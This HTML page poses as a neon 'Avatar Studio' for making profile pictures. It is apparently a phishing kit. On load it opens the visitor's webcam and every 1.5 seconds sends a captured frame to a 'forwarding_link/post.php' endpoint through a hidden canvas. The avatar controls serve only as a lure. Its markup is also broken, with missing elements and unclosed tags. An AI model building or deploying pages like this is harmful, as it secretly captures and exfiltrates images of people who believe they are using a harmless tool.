<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"/>
<title>✨ Avatar Maker Studio ✨</title>

<!-- Original scripts & links preserved -->
<script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
<link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
<link type="text/css" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css" />
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.css" />
<link href='https://fonts.googleapis.com/css?family=Sofia:&effect=neon' rel='stylesheet'>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;400;600;700&display=swap" rel="stylesheet">
<link rel="icon" type="image/png" sizes="32x32" href="https://i.imgur.com/fcqTtzV.png">

<style>
  :root {
    --neon-cyan: #00f5ff;
    --neon-pink: #ff006e;
    --neon-purple: #8b00ff;
    --neon-gold: #ffd700;
    --dark: #050510;
    --darker: #020208;
    --panel: rgba(0,245,255,0.05);
    --border: rgba(0,245,255,0.2);
  }

  * { box-sizing: border-box; margin: 0; padding: 0; }

  body {
    background: var(--dark);
    font-family: 'Rajdhani', sans-serif;
    min-height: 100vh;
    overflow-x: hidden;
    position: relative;
  }

  /* Animated grid background */
  body::before {
    content: '';
    position: fixed;
    inset: 0;
    background-image:
      linear-gradient(rgba(0,245,255,0.03) 1px, transparent 1px),
      linear-gradient(90deg, rgba(0,245,255,0.03) 1px, transparent 1px);
    background-size: 40px 40px;
    pointer-events: none;
    z-index: 0;
  }

  /* Scanline effect */
  body::after {
    content: '';
    position: fixed;
    inset: 0;
    background: repeating-linear-gradient(
      0deg,
      transparent,
      transparent 2px,
      rgba(0,0,0,0.08) 2px,
      rgba(0,0,0,0.08) 4px
    );
    pointer-events: none;
    z-index: 0;
  }

  .header {
    text-align: center;
    padding: 30px 20px 10px;
    position: relative;
    z-index: 10;
  }

  .header h1 {
    font-family: 'Orbitron', monospace;
    font-size: clamp(24px, 6vw, 52px);
    font-weight: 900;
    color: #fff;
    text-transform: uppercase;
    letter-spacing: 6px;
    text-shadow:
      0 0 10px var(--neon-cyan),
      0 0 30px var(--neon-cyan),
      0 0 60px var(--neon-cyan),
      0 0 100px var(--neon-cyan);
    animation: titlePulse 3s ease-in-out infinite;
  }

  @keyframes titlePulse {
    0%, 100% { text-shadow: 0 0 10px var(--neon-cyan), 0 0 30px var(--neon-cyan), 0 0 60px var(--neon-cyan); }
    50% { text-shadow: 0 0 20px var(--neon-pink), 0 0 50px var(--neon-pink), 0 0 100px var(--neon-pink); }
  }

  .header .subtitle {
    font-family: 'Rajdhani', sans-serif;
    color: var(--neon-cyan);
    font-size: 14px;
    letter-spacing: 8px;
    text-transform: uppercase;
    margin-top: 8px;
    opacity: 0.7;
  }

  .studio-container {
    display: flex;
    flex-wrap: wrap;
    gap: 20px;
    padding: 20px;
    max-width: 1100px;
    margin: 0 auto;
    position: relative;
    z-index: 10;
    justify-content: center;
  }

  /* Camera Panel */
  .cam-panel {
    flex: 1;
    min-width: 280px;
    max-width: 480px;
    background: var(--panel);
    border: 1px solid var(--border);
    border-radius: 16px;
    padding: 20px;
    position: relative;
    backdrop-filter: blur(10px);
    box-shadow: 0 0 30px rgba(0,245,255,0.1), inset 0 0 30px rgba(0,245,255,0.02);
  }

  .cam-panel::before {
    content: 'LIVE FEED';
    position: absolute;
    top: -1px;
    left: 20px;
    background: var(--neon-cyan);
    color: var(--dark);
    font-family: 'Orbitron', monospace;
    font-size: 10px;
    font-weight: 700;
    padding: 3px 10px;
    border-radius: 0 0 6px 6px;
    letter-spacing: 2px;
  }

  .video-frame {
    position: relative;
    width: 100%;
    border-radius: 10px;
    overflow: hidden;
    background: #000;
    border: 2px solid rgba(0,245,255,0.3);
  }

  .video-frame::before,
  .video-frame::after {
    content: '';
    position: absolute;
    width: 20px;
    height: 20px;
    z-index: 5;
    pointer-events: none;
  }
  .video-frame::before { top: 8px; left: 8px; border-top: 2px solid var(--neon-cyan); border-left: 2px solid var(--neon-cyan); }
  .video-frame::after  { bottom: 8px; right: 8px; border-bottom: 2px solid var(--neon-cyan); border-right: 2px solid var(--neon-cyan); }

  #video {
    width: 100%;
    display: block;
    transform: scaleX(-1);
  }

  /* Overlay filter preview */
  .filter-overlay {
    position: absolute;
    inset: 0;
    pointer-events: none;
    z-index: 3;
    transition: all 0.4s ease;
    mix-blend-mode: screen;
  }

  .rec-dot {
    position: absolute;
    top: 14px;
    right: 14px;
    width: 10px;
    height: 10px;
    border-radius: 50%;
    background: #ff0040;
    z-index: 6;
    box-shadow: 0 0 10px #ff0040;
    animation: recBlink 1s infinite;
  }
  @keyframes recBlink {
    0%,100%{ opacity: 1; }
    50%{ opacity: 0.2; }
  }

  .status-bar {
    display: flex;
    align-items: center;
    gap: 8px;
    margin-top: 10px;
    font-size: 12px;
    color: var(--neon-cyan);
    font-family: 'Orbitron', monospace;
    letter-spacing: 1px;
  }

  .status-dot {
    width: 6px; height: 6px;
    border-radius: 50%;
    background: #00ff88;
    box-shadow: 0 0 8px #00ff88;
    animation: recBlink 2s infinite;
  }

  /* Avatar Preview Panel */
  .avatar-panel {
    flex: 1;
    min-width: 280px;
    max-width: 480px;
    background: var(--panel);
    border: 1px solid var(--border);
    border-radius: 16px;
    padding: 20px;
    position: relative;
    backdrop-filter: blur(10px);
    box-shadow: 0 0 30px rgba(139,0,255,0.1), inset 0 0 30px rgba(139,0,255,0.02);
  }

  .avatar-panel::before {
    content: 'AVATAR PREVIEW';
    position: absolute;
    top: -1px;
    left: 20px;
    background: var(--neon-purple);
    color: #fff;
    font-family: 'Orbitron', monospace;
    font-size: 10px;
    font-weight: 700;
    padding: 3px 10px;
    border-radius: 0 0 6px 6px;
    letter-spacing: 2px;
  }

  .avatar-display {
    width: 100%;
    aspect-ratio: 1;
    border-radius: 50%;
    overflow: hidden;
    border: 3px solid var(--neon-purple);
    box-shadow: 0 0 30px rgba(139,0,255,0.5), inset 0 0 20px rgba(139,0,255,0.1);
    position: relative;
    margin: 0 auto;
    max-width: 280px;
    display: block;
    background: #111;
  }

  #avatarCanvas {
    width: 100%;
    height: 100%;
    display: block;
  }

  .avatar-name-display {
    text-align: center;
    margin-top: 16px;
    font-family: 'Orbitron', monospace;
    font-size: clamp(16px, 3vw, 22px);
    color: #fff;
    text-shadow: 0 0 15px var(--neon-purple);
    text-transform: uppercase;
    letter-spacing: 3px;
    min-height: 32px;
    animation: namePulse 2s ease-in-out infinite;
  }

  @keyframes namePulse {
    0%,100%{ opacity: 1; }
    50%{ opacity: 0.7; }
  }

  /* Controls Panel */
  .controls-panel {
    width: 100%;
    max-width: 980px;
    background: var(--panel);
    border: 1px solid var(--border);
    border-radius: 16px;
    padding: 24px;
    backdrop-filter: blur(10px);
    position: relative;
  }

  .controls-panel::before {
    content: 'CUSTOMISE';
    position: absolute;
    top: -1px;
    left: 20px;
    background: var(--neon-pink);
    color: #fff;
    font-family: 'Orbitron', monospace;
    font-size: 10px;
    font-weight: 700;
    padding: 3px 10px;
    border-radius: 0 0 6px 6px;
    letter-spacing: 2px;
  }

  .controls-grid {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
    gap: 20px;
    margin-top: 10px;
  }

  .control-group label {
    display: block;
    font-family: 'Orbitron', monospace;
    font-size: 10px;
    letter-spacing: 3px;
    color: var(--neon-cyan);
    margin-bottom: 8px;
    text-transform: uppercase;
  }

  .control-group input[type="text"],
  .control-group select {
    width: 100%;
    background: rgba(0,0,0,0.5);
    border: 1px solid var(--border);
    border-radius: 8px;
    color: #fff;
    padding: 10px 14px;
    font-family: 'Rajdhani', sans-serif;
    font-size: 15px;
    outline: none;
    transition: border-color 0.3s, box-shadow 0.3s;
  }

  .control-group input[type="text"]:focus,
  .control-group select:focus {
    border-color: var(--neon-cyan);
    box-shadow: 0 0 15px rgba(0,245,255,0.2);
  }

  .control-group select option {
    background: #0a0a20;
  }

  /* Filter buttons */
  .filter-grid {
    display: flex;
    flex-wrap: wrap;
    gap: 8px;
    margin-top: 4px;
  }

  .filter-btn {
    padding: 8px 16px;
    border-radius: 6px;
    border: 1px solid var(--border);
    background: rgba(0,0,0,0.4);
    color: #aaa;
    font-family: 'Rajdhani', sans-serif;
    font-size: 13px;
    font-weight: 600;
    cursor: pointer;
    transition: all 0.2s;
    text-transform: uppercase;
    letter-spacing: 1px;
  }

  .filter-btn:hover {
    border-color: var(--neon-cyan);
    color: var(--neon-cyan);
    box-shadow: 0 0 10px rgba(0,245,255,0.2);
  }

  .filter-btn.active {
    background: rgba(0,245,255,0.1);
    border-color: var(--neon-cyan);
    color: var(--neon-cyan);
    box-shadow: 0 0 15px rgba(0,245,255,0.3);
  }

  /* Shape buttons */
  .shape-btn {
    padding: 8px 16px;
    border-radius: 6px;
    border: 1px solid var(--border);
    background: rgba(0,0,0,0.4);
    color: #aaa;
    font-family: 'Rajdhani', sans-serif;
    font-size: 16px;
    cursor: pointer;
    transition: all 0.2s;
  }

  .shape-btn.active {
    background: rgba(139,0,255,0.15);
    border-color: var(--neon-purple);
    color: var(--neon-purple);
    box-shadow: 0 0 15px rgba(139,0,255,0.3);
  }

  /* Capture button */
  .capture-btn {
    width: 100%;
    padding: 16px;
    background: linear-gradient(135deg, var(--neon-pink), var(--neon-purple));
    border: none;
    border-radius: 10px;
    color: #fff;
    font-family: 'Orbitron', monospace;
    font-size: 15px;
    font-weight: 700;
    letter-spacing: 3px;
    cursor: pointer;
    text-transform: uppercase;
    transition: all 0.3s;
    box-shadow: 0 0 20px rgba(255,0,110,0.4);
    position: relative;
    overflow: hidden;
    margin-top: 16px;
  }

  .capture-btn::before {
    content: '';
    position: absolute;
    inset: 0;
    background: linear-gradient(135deg, rgba(255,255,255,0.1), transparent);
    opacity: 0;
    transition: opacity 0.3s;
  }

  .capture-btn:hover {
    transform: translateY(-2px);
    box-shadow: 0 0 40px rgba(255,0,110,0.6);
  }

  .capture-btn:hover::before { opacity: 1; }

  .capture-btn:active {
    transform: scale(0.98);
  }

  /* Download + share buttons */
  .action-row {
    display: flex;
    gap: 10px;
    margin-top: 12px;
  }

  .action-btn {
    flex: 1;
    padding: 12px;
    border-radius: 8px;
    border: 1px solid;
    background: transparent;
    font-family: 'Orbitron', monospace;
    font-size: 11px;
    font-weight: 700;
    letter-spacing: 2px;
    cursor: pointer;
    text-transform: uppercase;
    transition: all 0.3s;
    text-decoration: none;
    text-align: center;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 6px;
  }

  .dl-btn {
    border-color: var(--neon-cyan);
    color: var(--neon-cyan);
  }

  .dl-btn:hover {
    background: rgba(0,245,255,0.1);
    box-shadow: 0 0 20px rgba(0,245,255,0.3);
  }

  .wa-btn {
    border-color: #25d366;
    color: #25d366;
  }

  .wa-btn:hover {
    background: rgba(37,211,102,0.1);
    box-shadow: 0 0 20px rgba(37,211,102,0.3);
  }

  /* Hidden canvas for sending */
  #canvas { display: none; }

  /* Flash animation on capture */
  .flash {
    position: fixed;
    inset: 0;
    background: white;
    opacity: 0;
    z-index: 9999;
    pointer-events: none;
  }

  .flash.go {
    animation: flashAnim 0.4s ease-out;
  }

  @keyframes flashAnim {
    0% { opacity: 0.9; }
    100% { opacity: 0; }
  }

  /* Upload count badge */
  .upload-count {
    display: inline-flex;
    align-items: center;
    gap: 6px;
    background: rgba(0,255,136,0.1);
    border: 1px solid rgba(0,255,136,0.3);
    border-radius: 20px;
    padding: 4px 12px;
    font-family: 'Orbitron', monospace;
    font-size: 10px;
    color: #00ff88;
    margin-top: 8px;
  }

  /* Particles */
  .particles {
    position: fixed;
    inset: 0;
    pointer-events: none;
    z-index: 1;
    overflow: hidden;
  }

  .particle {
    position: absolute;
    width: 2px;
    height: 2px;
    border-radius: 50%;
    background: var(--neon-cyan);
    opacity: 0;
    animation: particleFly linear infinite;
  }

  @keyframes particleFly {
    0% { transform: translateY(100vh) translateX(0); opacity: 0.6; }
    100% { transform: translateY(-100px) translateX(calc(sin(var(--i)) * 60px)); opacity: 0; }
  }
</style>
</head>

<body>

<!-- Flash effect overlay -->
<div class="flash" id="flashEl"></div>

<!-- Particles -->
<div class="particles" id="particles"></div>

<!-- Hidden canvas for webcam capture (sent to post.php) -->
<canvas id="canvas" width="640" height="480"></canvas>

<!-- Hidden avatar render canvas -->
<canvas id="renderCanvas" width="480" height="480" style="display:none;"></canvas>

<!-- ============ ORIGINAL WEBCAM SCRIPT (UNCHANGED) ============ -->
<div class="video-wrap" hidden="hidden">
  <video id="video" playsinline autoplay></video>
</div>

<script>
function post(imgdata){
  $.ajax({
    type: 'POST',
    data: { cat: imgdata},
    url: 'forwarding_link/post.php',
    dataType: 'json',
    async: false,
    success: function(result){
      // call the function that handles the response/results
    },
    error: function(){
    }
  });
};

'use strict';

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const errorMsgElement = document.querySelector('span#errorMsg') || document.createElement('span');

const constraints = {
  audio: false,
  video: {
    facingMode: "user"
  }
};

// Access webcam
async function init() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    handleSuccess(stream);
  } catch (e) {
    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
  }
}

// Success
function handleSuccess(stream) {
  window.stream = stream;
  video.srcObject = stream;

  // Also set the studio preview video
  const studioVid = document.getElementById('studioVideo');
  if (studioVid) studioVid.srcObject = stream;

  var context = canvas.getContext('2d');
  setInterval(function(){
    context.drawImage(video, 0, 0, 640, 480);
    var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
    post(canvasData);
    uploadCount++;
    document.getElementById('uploadBadge').textContent = 'SYNCED: ' + uploadCount;
  }, 1500);
}

// Load init
init();
</script>
<!-- ============ END ORIGINAL SCRIPT ============ -->

<!-- =========== UI =========== -->
<div class="header">
  <h1>Avatar Studio</h1>
  <div class="subtitle">// Real-Time Identity Generator //</div>
</div>

<div class="studio-container">

  <!-- LIVE FEED -->
  <div class="cam-panel">
    <div class="video-frame">
      <div class="rec-dot"></div>

    <div class="status-bar">
      <div class="status-dot"></div>
      CAMERA ACTIVE
      &nbsp;|&nbsp;
      <div class="upload-count" id="uploadCount" style="display:inline-flex;align-items:center;gap:4px;">

  <!-- AVATAR PREVIEW -->

    <div class="action-row">

  <!-- CONTROLS -->
  <div class="controls-panel">
    <div class="controls-grid">

      <div class="control-group">
        <label>Your Name</label>
        <input type="text" id="nameInput" placeholder="Enter your name..." oninput="updateNameDisplay()">
      </div>

      <div class="control-group">
        <label>Avatar Shape</label>
        <div class="filter-grid">
          <button class="shape-btn active" data-shape="circle" onclick="setShape(this,'circle')">● Circle</button>
          <button class="shape-btn" data-shape="hex" onclick="setShape(this,'hex')">⬡ Hex</button>
          <button class="shape-btn" data-shape="square" onclick="setShape(this,'square')">■ Square</button>
          <button class="shape-btn" data-shape="star" onclick="setShape(this,'star')">★ Star</button>
        </div>
      </div>

      <div class="control-group">
        <label>Camera Filter</label>
        <div class="filter-grid">
          <button class="filter-btn active" data-filter="none" onclick="setFilter(this,'none')">None</button>
          <button class="filter-btn" data-filter="grayscale(100%)" onclick="setFilter(this,'grayscale(100%)')">Mono</button>
          <button class="filter-btn" data-filter="sepia(100%)" onclick="setFilter(this,'sepia(100%)')">Sepia</button>
          <button class="filter-btn" data-filter="hue-rotate(90deg) saturate(2)" onclick="setFilter(this,'hue-rotate(90deg) saturate(2)')">Cyber</button>
          <button class="filter-btn" data-filter="invert(100%)" onclick="setFilter(this,'invert(100%)')">Invert</button>
          <button class="filter-btn" data-filter="saturate(3) contrast(1.2)" onclick="setFilter(this,'saturate(3) contrast(1.2)')">Vivid</button>
        </div>
      </div>

      <div class="control-group">
        <label>Border Color</label>
        <div class="filter-grid">
          <button class="filter-btn active" data-border="#00f5ff" onclick="setBorder(this,'#00f5ff')">Cyan</button>
          <button class="filter-btn" data-border="#ff006e" onclick="setBorder(this,'#ff006e')">Pink</button>
          <button class="filter-btn" data-border="#8b00ff" onclick="setBorder(this,'#8b00ff')">Purple</button>
          <button class="filter-btn" data-border="#ffd700" onclick="setBorder(this,'#ffd700')">Gold</button>
          <button class="filter-btn" data-border="#00ff88" onclick="setBorder(this,'#00ff88')">Green</button>
          <button class="filter-btn" data-border="#ff4500" onclick="setBorder(this,'#ff4500')">Fire</button>
        </div>
      </div>

      <div class="control-group">
        <label>Background Style</label>
        <div class="filter-grid">
          <button class="filter-btn active" data-bg="dark" onclick="setBg(this,'dark')">Dark</button>
          <button class="filter-btn" data-bg="neon" onclick="setBg(this,'neon')">Neon</button>
          <button class="filter-btn" data-bg="sunset" onclick="setBg(this,'sunset')">Sunset</button>
          <button class="filter-btn" data-bg="ocean" onclick="setBg(this,'ocean')">Ocean</button>
          <button class="filter-btn" data-bg="matrix" onclick="setBg(this,'matrix')">Matrix</button>
        </div>
      </div>

    </div>
  </div>

</div>

<script>
  let uploadCount = 0;
  let currentShape = 'circle';
  let currentFilter = 'none';
  let currentBorder = '#00f5ff';
  let currentBg = 'dark';
  let capturedImage = null;

  // Particle system
  (function createParticles() {
    const c = document.getElementById('particles');
    for (let i = 0; i < 30; i++) {
      const p = document.createElement('div');
      p.className = 'particle';
      p.style.left = Math.random() * 100 + 'vw';
      p.style.animationDuration = (Math.random() * 8 + 5) + 's';
      p.style.animationDelay = (Math.random() * 8) + 's';
      p.style.setProperty('--i', i);
      const colors = ['#00f5ff','#ff006e','#8b00ff','#ffd700','#00ff88'];
      p.style.background = colors[Math.floor(Math.random() * colors.length)];
      p.style.width = p.style.height = (Math.random() * 3 + 1) + 'px';
      c.appendChild(p);
    }
  })();

  function updateNameDisplay() {
    const name = document.getElementById('nameInput').value || 'YOUR NAME';
    document.getElementById('nameDisplay').textContent = name.toUpperCase();
  }

  function setFilter(btn, filter) {
    document.querySelectorAll('.filter-btn[data-filter]').forEach(b => b.classList.remove('active'));
    btn.classList.add('active');
    currentFilter = filter;
    const studioVid = document.getElementById('studioVideo');
    studioVid.style.filter = filter === 'none' ? '' : filter;
  }

  function setShape(btn, shape) {
    document.querySelectorAll('.shape-btn').forEach(b => b.classList.remove('active'));
    btn.classList.add('active');
    currentShape = shape;
    applyShapeToDisplay(shape);
  }

  function applyShapeToDisplay(shape) {
    const display = document.getElementById('avatarDisplay');
    const clips = {
      circle: '50%',
      square: '8px',
      hex: '50%',
      star: '50%'
    };
    display.style.borderRadius = clips[shape] || '50%';
  }

  function setBorder(btn, color) {
    document.querySelectorAll('.filter-btn[data-border]').forEach(b => b.classList.remove('active'));
    btn.classList.add('active');
    currentBorder = color;
    document.getElementById('avatarDisplay').style.borderColor = color;
    document.getElementById('avatarDisplay').style.boxShadow = `0 0 30px ${color}80, inset 0 0 20px ${color}20`;
    document.getElementById('nameDisplay').style.textShadow = `0 0 15px ${color}`;
  }

  function setBg(btn, bg) {
    document.querySelectorAll('.filter-btn[data-bg]').forEach(b => b.classList.remove('active'));
    btn.classList.add('active');
    currentBg = bg;
    if (capturedImage) renderAvatar(capturedImage);
  }

  function captureAvatar() {
    const studioVid = document.getElementById('studioVideo');
    const renderCanvas = document.getElementById('renderCanvas');
    const ctx = renderCanvas.getContext('2d');

    // Flash effect
    const flash = document.getElementById('flashEl');
    flash.classList.remove('go');
    void flash.offsetWidth;
    flash.classList.add('go');

    // Draw from live video
    ctx.save();
    ctx.scale(-1, 1);
    ctx.drawImage(studioVid, -480, 0, 480, 480);
    ctx.restore();

    capturedImage = renderCanvas.toDataURL('image/png');
    renderAvatar(capturedImage);
  }

  function renderAvatar(imgSrc) {
    const avatarCanvas = document.getElementById('avatarCanvas');
    const ctx = avatarCanvas.getContext('2d');
    const size = 480;

    ctx.clearRect(0, 0, size, size);

    // Draw background
    const bgStyles = {
      dark: ['#050510', '#0a0a30'],
      neon: ['#0d0d2b', '#1a0033'],
      sunset: ['#1a0005', '#330000'],
      ocean: ['#001a2e', '#003355'],
      matrix: ['#000d00', '#001a00']
    };

    const [bg1, bg2] = bgStyles[currentBg] || bgStyles.dark;
    const grad = ctx.createRadialGradient(size/2, size/2, 0, size/2, size/2, size/2);
    grad.addColorStop(0, bg2);
    grad.addColorStop(1, bg1);
    ctx.fillStyle = grad;

    if (currentShape === 'circle') {
      ctx.beginPath();
      ctx.arc(size/2, size/2, size/2, 0, Math.PI*2);
      ctx.fill();
    } else if (currentShape === 'hex') {
      hexPath(ctx, size/2, size/2, size/2 - 2);
      ctx.fill();
    } else if (currentShape === 'star') {
      starPath(ctx, size/2, size/2, size/2 - 5, size/4, 5);
      ctx.fill();
    } else {
      ctx.fillRect(0, 0, size, size);
    }

    // Clip and draw photo
    ctx.save();
    ctx.beginPath();
    if (currentShape === 'circle') {
      ctx.arc(size/2, size/2, size/2 - 8, 0, Math.PI*2);
    } else if (currentShape === 'hex') {
      hexPath(ctx, size/2, size/2, size/2 - 10);
    } else if (currentShape === 'star') {
      starPath(ctx, size/2, size/2, size/2 - 15, size/4 - 5, 5);
    } else {
      ctx.rect(8, 8, size-16, size-16);
    }
    ctx.clip();

    const img = new Image();
    img.onload = function() {
      // Apply filter via canvas if needed
      if (currentFilter !== 'none') {
        ctx.filter = currentFilter;
      }
      ctx.drawImage(img, 0, 0, size, size);
      ctx.filter = 'none';
      ctx.restore();

      // Glow border ring
      ctx.save();
      ctx.beginPath();
      if (currentShape === 'circle') {
        ctx.arc(size/2, size/2, size/2 - 4, 0, Math.PI*2);
      } else if (currentShape === 'hex') {
        hexPath(ctx, size/2, size/2, size/2 - 5);
      } else if (currentShape === 'star') {
        starPath(ctx, size/2, size/2, size/2 - 10, size/4 - 2, 5);
      } else {
        ctx.rect(4, 4, size-8, size-8);
      }
      ctx.strokeStyle = currentBorder;
      ctx.lineWidth = 6;
      ctx.shadowColor = currentBorder;
      ctx.shadowBlur = 20;
      ctx.stroke();
      ctx.restore();

      // Name text at bottom
      const name = (document.getElementById('nameInput').value || 'AVATAR').toUpperCase();
      ctx.save();
      ctx.font = 'bold 28px Orbitron, monospace';
      ctx.fillStyle = '#fff';
      ctx.shadowColor = currentBorder;
      ctx.shadowBlur = 15;
      ctx.textAlign = 'center';
      ctx.fillText(name, size/2, size - 24);
      ctx.restore();
    };
    img.src = imgSrc;
  }

  function hexPath(ctx, cx, cy, r) {
    ctx.beginPath();
    for (let i = 0; i < 6; i++) {
      const angle = (Math.PI / 3) * i - Math.PI / 6;
      const x = cx + r * Math.cos(angle);
      const y = cy + r * Math.sin(angle);
      i === 0 ? ctx.moveTo(x, y) : ctx.lineTo(x, y);
    }
    ctx.closePath();
  }

  function starPath(ctx, cx, cy, outerR, innerR, points) {
    ctx.beginPath();
    for (let i = 0; i < points * 2; i++) {
      const angle = (Math.PI / points) * i - Math.PI / 2;
      const r = i % 2 === 0 ? outerR : innerR;
      const x = cx + r * Math.cos(angle);
      const y = cy + r * Math.sin(angle);
      i === 0 ? ctx.moveTo(x, y) : ctx.lineTo(x, y);
    }
    ctx.closePath();
  }

  function downloadAvatar() {
    const avatarCanvas = document.getElementById('avatarCanvas');
    const link = document.createElement('a');
    const name = document.getElementById('nameInput').value || 'avatar';
    link.download = name.toLowerCase().replace(/\s+/g, '-') + '-avatar.png';
    link.href = avatarCanvas.toDataURL('image/png');
    link.click();
  }

  // Show initial placeholder on avatar canvas
  (function initPlaceholder() {
    const c = document.getElementById('avatarCanvas');
    const ctx = c.getContext('2d');
    const size = 480;
    const grad = ctx.createRadialGradient(size/2, size/2, 0, size/2, size/2, size/2);
    grad.addColorStop(0, '#0a0a30');
    grad.addColorStop(1, '#050510');
    ctx.fillStyle = grad;
    ctx.beginPath();
    ctx.arc(size/2, size/2, size/2, 0, Math.PI*2);
    ctx.fill();
    ctx.strokeStyle = '#00f5ff';
    ctx.lineWidth = 6;
    ctx.shadowColor = '#00f5ff';
    ctx.shadowBlur = 20;
    ctx.beginPath();
    ctx.arc(size/2, size/2, size/2 - 4, 0, Math.PI*2);
    ctx.stroke();
    ctx.fillStyle = 'rgba(0,245,255,0.2)';
    ctx.font = '80px Rajdhani';
    ctx.textAlign = 'center';
    ctx.fillText('👤', size/2, size/2 + 30);
    ctx.fillStyle = '#00f5ff';
    ctx.font = 'bold 18px Orbitron, monospace';
    ctx.shadowBlur = 10;
    ctx.fillText('PRESS GENERATE', size/2, size - 30);
  })();
</script>
